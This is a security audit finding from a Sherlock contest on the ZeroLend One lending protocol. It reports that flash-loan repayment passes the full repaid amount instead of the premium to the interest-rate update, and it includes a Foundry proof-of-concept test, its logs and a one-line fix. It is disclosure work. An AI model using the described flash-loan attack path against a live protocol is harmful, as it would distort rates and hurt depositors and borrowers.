Big Admiral Dove

High

# Incorrect update of borrow & liquidity interest rates when postprocessing a flash loan

### Summary

When postprocessing a flash loan, the `FlashLoanLogic` provides wrong loan fee value to the interest rate strategy as a balance update that will cause highly incorrect calculation of liqiduity & borrow rate values.

### Root Cause

In [FlashLoanLogic.sol:L118](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118) `amountPlusPremium` is wrongly provided instead of `_params.totalPremium`.

```solidity
  function _handleFlashLoanRepayment(
    DataTypes.ReserveData storage _reserve,
    DataTypes.ReserveSupplies storage _totalSupplies,
    DataTypes.FlashLoanRepaymentParams memory _params
  ) internal {
    ... ...

    _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', ''); // <-- @audit-issue

    ... ...
  }
```

### Internal pre-conditions

- A reserve should have some debt so that the protocol can update the borrow rate.

### External pre-conditions

_No response_

### Attack Path

A malicious actor just borrows a flash loan to destabilize the ecosystem of a reserve.

### Impact

After a flash loan, the balance change should be just a flash loan fee but the logic provides the entire loan repay as the balance change to update the interest rates.

Therefore excessively out-of-orbit interest rates will severely disrupt the normal deposit and borrowing operations.

### PoC

I added this test case to `PoolFlashLoanTests.t.sol`.
```solidity
  function test_simple_flashloan_underlyingbalance_poc() public {
    bytes memory emptyParams;
    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);
    _generateFlashloanCondition();

    vm.prank(bob);
    pool.borrowSimple(address(tokenA), bob, 50 ether, 0);

    poolFactory.setFlashloanPremium(2);
    uint256 premium = poolFactory.flashLoanPremiumToProtocol();
    assertEq(premium, 2);

    DataTypes.ReserveSupplies memory reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
    console.log("underlyingBalance Before flash loan: ", reserveSuppliesData.underlyingBalance);
    console.log("Actual Balance Before flash loan: ", tokenA.balanceOf(address(pool)), "\n");

    vm.warp(block.timestamp + 1 hours);

    vm.startPrank(alice);

    vm.expectEmit(true, true, true, true);
    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 1000 ether, (1000 ether * premium) / 10_000);
    emit Transfer(address(0), address(mockFlashSimpleReceiver), (1000 ether * premium) / 10_000);

    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 1000 ether, emptyParams);
    vm.stopPrank();

    reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
    console.log("underlyingBalance After flash loan: ", reserveSuppliesData.underlyingBalance);
    console.log("Actual Balance After flash loan: ", tokenA.balanceOf(address(pool)), "\n");

    DataTypes.ReserveData memory reserveData = pool.getReserveData(address(tokenA));
    console.log("Borrow Rate After flash loan: ", reserveData.borrowRate);
    console.log("Liquidity Rate After flash loan: ", reserveData.liquidityRate);
  }
```

Here are the logs after running `forge test --match-test test_simple_flashloan_underlyingbalance_poc -vv`.
```bash
Ran 1 test for test/forge/core/pool/PoolFlashLoanTests.t.sol:PoolFlashLoanTests
[PASS] test_simple_flashloan_underlyingbalance_poc() (gas: 1203761)
Logs:
  underlyingBalance Before flash loan:  1950000000000000000000
  Actual Balance Before flash loan:  1950000000000000000000

  underlyingBalance After flash loan:  2950200000000000000000 // Wrongly exceeded underlyingBalance
  Actual Balance After flash loan:  1950200000000000000000 

  Borrow Rate After flash loan:  3723033495027083612665660 // The correct value should be 7445322453155295630384002
  Liquidity Rate After flash loan:  93066569291342618100614 // The correct value should be 372191834611220613848101
```

### Mitigation

Just replace `amountPlusPremium` with `_params.totalPremium` from the issued line:

```diff
-   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', '');
+   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), _params.totalPremium, 0, '', '');
```
